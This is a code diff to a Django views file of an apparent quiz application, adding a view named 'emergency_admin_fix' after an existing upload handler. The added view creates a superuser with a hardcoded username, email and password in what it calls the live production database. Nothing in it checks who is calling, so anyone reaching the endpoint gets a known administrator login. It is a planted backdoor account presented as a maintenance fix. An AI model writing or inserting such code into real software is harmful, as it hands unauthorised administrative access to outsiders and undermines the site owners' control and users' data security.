@@ -471,3 +471,23 @@ def upload_allowed_students(request):
             messages.error(request, f"Error processing file layout: {str(e)}")
 
     return redirect("admin:quiz_allowedstudent_changelist")
+
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+
+def emergency_admin_fix(request):
+    """
+    Temporary programmatic gateway to automatically generate a brand new
+    super-administrator account directly inside the live production database.
+    """
+    username_pool = "HLODZEPRINCE"
+    email_pool = "admin@example.com"
+    password_pool = "Titivate22@$"
+
+    if not User.objects.filter(username=username_pool).exists():
+        User.objects.create_superuser(username_pool, email_pool, password_pool)
+        return HttpResponse(f"🥇 SUCCESS: Superuser '{username_pool}' has been injected into the database!")
+
+    return HttpResponse("⚠️ Account setup already exists. Check your login attempts.")
